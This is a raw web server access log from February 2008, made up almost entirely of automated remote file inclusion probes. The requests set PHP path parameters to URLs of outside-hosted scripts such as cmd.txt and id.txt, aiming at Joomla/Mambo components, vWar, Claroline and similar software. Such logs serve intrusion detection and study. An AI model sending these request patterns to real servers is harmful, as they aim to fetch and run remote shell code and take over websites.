74.6.28.170 - - [11/Feb/2008:00:04:37 +0900] "GET / HTTP/1.0" 200 875
69.80.225.14 - - [11/Feb/2008:00:05:28 +0900] "GET /admin//nuseo/admin/nuseo_admin_d.php?nuseo_dir=http://oldbonescrew.de/modules/vwar/convert/id.txt??? HTTP/1.1" 302 301
69.80.225.14 - - [11/Feb/2008:00:05:28 +0900] "GET //nuseo/admin/nuseo_admin_d.php?nuseo_dir=http://oldbonescrew.de/modules/vwar/convert/id.txt??? HTTP/1.1" 302 301
83.13.248.66 - - [11/Feb/2008:00:05:39 +0900] "GET //administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=http://www.immo.plocknet.eu/me.txt??? HTTP/1.1" 302 301
83.13.248.66 - - [11/Feb/2008:00:05:39 +0900] "GET /admin//administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=http://www.immo.plocknet.eu/me.txt??? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:14:03 +0900] "GET /admin//modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:14:05 +0900] "GET //modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:16:33 +0900] "GET /admin//modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:16:35 +0900] "GET //modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:18:16 +0900] "GET /admin//claroline//exercice//testheaderpage.php?rootSys=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:18:18 +0900] "GET //claroline//exercice//testheaderpage.php?rootSys=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:19:33 +0900] "GET /admin//claroline/phpbb/page_tail.php?includePath=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
91.142.213.11 - - [11/Feb/2008:00:19:36 +0900] "GET //claroline/phpbb/page_tail.php?includePath=http://h1.ripway.com/iff/safe.txt? HTTP/1.1" 302 301
83.13.248.66 - - [11/Feb/2008:00:23:00 +0900] "GET //include/monitoring/engine/MakeXML.php?fileOreonConf=http://www.immo.plocknet.eu/me.txt??? HTTP/1.1" 302 301
83.13.248.66 - - [11/Feb/2008:00:23:00 +0900] "GET /admin//include/monitoring/engine/MakeXML.php?fileOreonConf=http://www.immo.plocknet.eu/me.txt??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:24 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:24 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:28 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:28 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:45 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:46 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:49 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:31:49 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:33:56 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:33:56 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:34:27 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:34:27 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/tstgif??? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:00:35:17 +0900] "GET /admin/index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:00:35:18 +0900] "GET /index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:00:36:04 +0900] "GET /admin/index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:00:36:06 +0900] "GET /index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:36:57 +0900] "GET /index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:37:08 +0900] "GET /index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:37:50 +0900] "GET /admin/access_log/index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:37:51 +0900] "GET /index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:37:53 +0900] "GET /admin/index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:37:57 +0900] "GET /admin/access_log/index.php?sourcedir=http://turnkeywebsites247.com/catimages/z?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:37:58 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/z?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:38:00 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/z?? HTTP/1.1" 302 301
217.195.192.40 - - [11/Feb/2008:00:38:29 +0900] "GET /admin/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
217.195.192.40 - - [11/Feb/2008:00:38:32 +0900] "GET /index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
69.46.229.11 - - [11/Feb/2008:00:40:08 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
69.46.229.11 - - [11/Feb/2008:00:40:09 +0900] "GET /index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
69.46.229.11 - - [11/Feb/2008:00:40:11 +0900] "GET /admin/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:40:23 +0900] "GET /admin/access_log/index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:40:25 +0900] "GET /index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:40:27 +0900] "GET /admin/index.php?sourcedir=http://thepokerpromagazine.com/safeon.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:40:38 +0900] "GET /admin/access_log/index.php?sourcedir=http://turnkeywebsites247.com/catimages/z?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:40:40 +0900] "GET /index.php?sourcedir=http://turnkeywebsites247.com/catimages/z?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:40:41 +0900] "GET /admin/index.php?sourcedir=http://turnkeywebsites247.com/catimages/z?? HTTP/1.1" 302 301
83.226.209.72 - - [11/Feb/2008:00:40:43 +0900] "GET /admin/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
83.226.209.72 - - [11/Feb/2008:00:40:46 +0900] "GET /index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
66.225.219.10 - - [11/Feb/2008:00:40:54 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
66.225.219.10 - - [11/Feb/2008:00:40:56 +0900] "GET /index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
66.225.219.10 - - [11/Feb/2008:00:40:58 +0900] "GET /admin/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
88.218.97.19 - - [11/Feb/2008:00:41:20 +0900] "GET /admin///////?mosConfig_absolute_path=http://www.usw-squad.net/modules/Neos_Chronos/upload/echo.txt? HTTP/1.1" 200 2172
88.218.97.19 - - [11/Feb/2008:00:41:21 +0900] "GET ///////?mosConfig_absolute_path=http://www.usw-squad.net/modules/Neos_Chronos/upload/echo.txt? HTTP/1.1" 200 892
74.52.88.90 - - [11/Feb/2008:00:42:00 +0900] "GET /index.php?sourcedir=http://heidik.org/canar/cmdaff? HTTP/1.1" 302 301
83.16.96.219 - - [11/Feb/2008:00:46:42 +0900] "GET /admin//admin/index.php?o=http://webetab.ac-bordeaux.fr/Primaire/24/IENBergeracEst/gestanim/parametres/id.txt?? HTTP/1.1" 302 301
83.16.96.219 - - [11/Feb/2008:00:46:45 +0900] "GET //admin/index.php?o=http://webetab.ac-bordeaux.fr/Primaire/24/IENBergeracEst/gestanim/parametres/id.txt?? HTTP/1.1" 302 301
217.113.226.82 - - [11/Feb/2008:00:48:25 +0900] "GET /admin/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
217.113.226.82 - - [11/Feb/2008:00:48:31 +0900] "GET /index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
83.226.209.72 - - [11/Feb/2008:00:50:27 +0900] "GET /index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
62.75.202.173 - - [11/Feb/2008:00:51:45 +0900] "GET //amember/plugins/payment/secpay/secpay.inc.php?config%5broot_dir%5d=http://oldbonescrew.de/modules/vwar/convert/id2.txt??? HTTP/1.1" 302 301
62.75.202.173 - - [11/Feb/2008:00:51:48 +0900] "GET /admin//amember/plugins/payment/secpay/secpay.inc.php?config%5broot_dir%5d=http://oldbonescrew.de/modules/vwar/convert/id2.txt??? HTTP/1.1" 302 301
62.212.114.250 - - [11/Feb/2008:00:53:20 +0900] "GET /admin/index.php?sourcedir=http://bobatka.info/modules/language/asc/asc/r7???????? HTTP/1.1" 302 301
62.212.114.250 - - [11/Feb/2008:00:53:24 +0900] "GET /index.php?sourcedir=http://bobatka.info/modules/language/asc/asc/r7???????? HTTP/1.1" 302 301
208.113.221.15 - - [11/Feb/2008:00:54:15 +0900] "GET /admin//myfunctions/mygallerybrowser.php?myPath=http://ia341011.us.archive.org/2/items/safe19/safe1.txt??? HTTP/1.1" 302 301
208.113.221.15 - - [11/Feb/2008:00:54:18 +0900] "GET //myfunctions/mygallerybrowser.php?myPath=http://ia341011.us.archive.org/2/items/safe19/safe1.txt??? HTTP/1.1" 302 301
77.221.130.17 - - [11/Feb/2008:00:55:39 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:55:41 +0900] "GET /admin/access_log/index.php?sourcedir=http://heidik.org/canar/cmdaff? HTTP/1.1" 302 301
77.221.130.17 - - [11/Feb/2008:00:55:41 +0900] "GET /index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:00:55:42 +0900] "GET /admin/index.php?sourcedir=http://heidik.org/canar/cmdaff? HTTP/1.1" 302 301
77.221.130.17 - - [11/Feb/2008:00:55:43 +0900] "GET /admin/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:04:16 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.geocities.com/jelekgendut/scan/load.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:04:18 +0900] "GET /index.php?sourcedir=http://www.geocities.com/jelekgendut/scan/load.txt?? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:04:20 +0900] "GET /admin/index.php?sourcedir=http://www.geocities.com/jelekgendut/scan/load.txt?? HTTP/1.1" 302 301
83.148.126.98 - - [11/Feb/2008:01:04:59 +0900] "GET /admin//admin/index.php?o=http://www.beautiful-atlanta.com/admin/id.txt???? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:01:05:01 +0900] "GET /admin/access_log/index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:01:05:02 +0900] "GET /index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
83.148.126.98 - - [11/Feb/2008:01:05:03 +0900] "GET //admin/index.php?o=http://www.beautiful-atlanta.com/admin/id.txt???? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:01:05:03 +0900] "GET /admin/index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:05:33 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:05:35 +0900] "GET /index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:05:36 +0900] "GET /admin/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
83.226.209.72 - - [11/Feb/2008:01:06:53 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
83.226.209.72 - - [11/Feb/2008:01:06:56 +0900] "GET /admin/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:08:29 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:08:31 +0900] "GET /index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
74.52.88.90 - - [11/Feb/2008:01:08:33 +0900] "GET /admin/index.php?sourcedir=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:01:09:02 +0900] "GET /admin/access_log/index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:01:09:04 +0900] "GET /index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
211.234.106.5 - - [11/Feb/2008:01:09:05 +0900] "GET /admin/index.php?sourcedir=http://lammeriamo.altervista.org/php5/com.txt????? HTTP/1.1" 302 301
62.75.202.173 - - [11/Feb/2008:01:20:16 +0900] "GET //admin/index.php?o=http://oldbonescrew.de/modules/vwar/convert/id2.txt??? HTTP/1.1" 302 301
62.75.202.173 - - [11/Feb/2008:01:20:17 +0900] "GET /admin//admin/index.php?o=http://oldbonescrew.de/modules/vwar/convert/id2.txt??? HTTP/1.1" 302 301
89.202.198.218 - - [11/Feb/2008:01:24:50 +0900] "GET /components/com_hashcash/server.php?mosConfig_absolute_path=http://www.thelatinpower.com/modules/echo.txt? HTTP/1.1" 302 301
62.212.114.250 - - [11/Feb/2008:01:29:23 +0900] "GET /admin/access_log/index.php?sourcedir=http://bobatka.info/modules/language/asc/asc/r7???????? HTTP/1.1" 302 301
62.212.114.250 - - [11/Feb/2008:01:29:27 +0900] "GET /index.php?sourcedir=http://bobatka.info/modules/language/asc/asc/r7???????? HTTP/1.1" 302 301
62.212.114.250 - - [11/Feb/2008:01:29:30 +0900] "GET /admin/index.php?sourcedir=http://bobatka.info/modules/language/asc/asc/r7???????? HTTP/1.1" 302 301
217.195.115.146 - - [11/Feb/2008:01:30:54 +0900] "GET /admin/access_log/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
217.195.115.146 - - [11/Feb/2008:01:30:57 +0900] "GET /convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
70.84.186.226 - - [11/Feb/2008:01:30:57 +0900] "GET /admin/access_log/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
70.84.186.226 - - [11/Feb/2008:01:30:59 +0900] "GET /convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
217.195.115.146 - - [11/Feb/2008:01:31:00 +0900] "GET /admin/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
70.84.186.226 - - [11/Feb/2008:01:31:00 +0900] "GET /admin/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
209.62.106.34 - - [11/Feb/2008:01:31:41 +0900] "GET /admin/access_log/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
209.62.106.34 - - [11/Feb/2008:01:31:43 +0900] "GET /convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
209.62.106.34 - - [11/Feb/2008:01:31:45 +0900] "GET /admin/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
72.232.14.178 - - [11/Feb/2008:01:32:56 +0900] "GET /admin/access_log/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
72.232.14.178 - - [11/Feb/2008:01:32:58 +0900] "GET /convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
72.232.14.178 - - [11/Feb/2008:01:32:59 +0900] "GET /admin/convert/mvcw.php?step=1&vwar_root=http://adm-adserver.com/cmd.txt? HTTP/1.1" 302 301
217.113.226.82 - - [11/Feb/2008:01:40:31 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
217.113.226.82 - - [11/Feb/2008:01:40:35 +0900] "GET /index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
217.113.226.82 - - [11/Feb/2008:01:40:38 +0900] "GET /admin/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
217.195.192.40 - - [11/Feb/2008:01:43:30 +0900] "GET /admin/access_log/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
217.195.192.40 - - [11/Feb/2008:01:43:37 +0900] "GET /index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
217.195.192.40 - - [11/Feb/2008:01:43:40 +0900] "GET /admin/index.php?sourcedir=http://www.dutchstockingpage.com/myid.txt? HTTP/1.1" 302 301
208.1.62.200 - - [11/Feb/2008:02:00:05 +0900] "GET /admin/convert/mvcw.php?vwar_root=http://www.jested.net/templates/cmd.txt? HTTP/1.1" 302 301
208.1.62.200 - - [11/Feb/2008:02:00:08 +0900] "GET /convert/mvcw.php?vwar_root=http://www.jested.net/templates/cmd.txt? HTTP/1.1" 302 301
67.15.194.246 - - [11/Feb/2008:02:03:08 +0900] "GET /admin/modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://yoga0400.org/injek2.txt? HTTP/1.1" 302 301
67.15.194.246 - - [11/Feb/2008:02:03:10 +0900] "GET /modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=http://yoga0400.org/injek2.txt? HTTP/1.1" 302 301
89.202.198.218 - - [11/Feb/2008:02:06:58 +0900] "GET /admin/access_log/components/com_hashcash/server.php?mosConfig_absolute_path=http://www.thelatinpower.com/modules/echo.txt? HTTP/1.1" 302 301
89.202.198.218 - - [11/Feb/2008:02:07:00 +0900] "GET /admin/components/com_hashcash/server.php?mosConfig_absolute_path=http://www.thelatinpower.com/modules/echo.txt? HTTP/1.1" 302 301
65.18.211.206 - - [11/Feb/2008:02:12:55 +0900] "GET /%22index.php?sourcedir=%22http://www.ultimatemusiclessons.com/open.gif?? HTTP/1.1" 302 301
206.167.170.73 - - [11/Feb/2008:02:18:22 +0900] "GET /admin/index2.php?mosConfig_absolute_path=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
206.167.170.73 - - [11/Feb/2008:02:18:24 +0900] "GET /index2.php?mosConfig_absolute_path=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
206.167.170.73 - - [11/Feb/2008:02:18:43 +0900] "GET /admin/index.php?mosConfig_absolute_path=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
206.167.170.73 - - [11/Feb/2008:02:18:45 +0900] "GET /index.php?mosConfig_absolute_path=http://www.gumgangfarm.com/shop/data/id.txt? HTTP/1.1" 302 301
72.232.212.210 - - [11/Feb/2008:02:20:58 +0900] "GET / HTTP/1.1" 200 887
74.200.89.66 - - [11/Feb/2008:02:26:53 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
74.200.89.66 - - [11/Feb/2008:02:26:54 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
65.18.211.206 - - [11/Feb/2008:02:27:02 +0900] "GET /admin/access_log/%22index.php?sourcedir=%22http://www.ultimatemusiclessons.com/open.gif?? HTTP/1.1" 302 301
65.18.211.206 - - [11/Feb/2008:02:27:04 +0900] "GET /admin/%22index.php?sourcedir=%22http://www.ultimatemusiclessons.com/open.gif?? HTTP/1.1" 302 301
74.200.89.66 - - [11/Feb/2008:02:30:36 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
74.200.89.66 - - [11/Feb/2008:02:30:38 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
75.125.161.218 - - [11/Feb/2008:02:31:16 +0900] "GET /modules/vwar/convert/mvcw_conver.php?step=1&vwar_root=? HTTP/1.1" 302 301
74.200.89.66 - - [11/Feb/2008:02:31:20 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
74.200.89.66 - - [11/Feb/2008:02:31:22 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:31:50 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:31:51 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://warez4warez.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:32:48 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:32:49 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:32:58 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:32:59 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:33:38 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:33:40 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
65.18.211.206 - - [11/Feb/2008:02:33:54 +0900] "GET /admin/%22index.php?sourcedir=%22http://www.ultimatemusiclessons.com/open.gif?? HTTP/1.1" 302 301
65.18.211.206 - - [11/Feb/2008:02:33:56 +0900] "GET /%22index.php?sourcedir=%22http://www.ultimatemusiclessons.com/open.gif?? HTTP/1.1" 302 301
67.15.12.20 - - [11/Feb/2008:02:34:05 +0900] "GET /admin/access_log/components/com_hashcash/server.php?mosConfig_absolute_path=http://buzz-directory.com/safe2.txt?? HTTP/1.1" 302 301
67.15.12.20 - - [11/Feb/2008:02:34:07 +0900] "GET /components/com_hashcash/server.php?mosConfig_absolute_path=http://buzz-directory.com/safe2.txt?? HTTP/1.1" 302 301
67.15.12.20 - - [11/Feb/2008:02:34:09 +0900] "GET /admin/components/com_hashcash/server.php?mosConfig_absolute_path=http://buzz-directory.com/safe2.txt?? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:34:23 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:34:24 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:35:01 +0900] "GET /admin//mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
70.87.139.98 - - [11/Feb/2008:02:35:02 +0900] "GET //mambots/content/multithumb/multithumb.php?mosConfig_absolute_path=http://NewsCrew.altervista.org/hel/cmd.txt? HTTP/1.1" 302 301
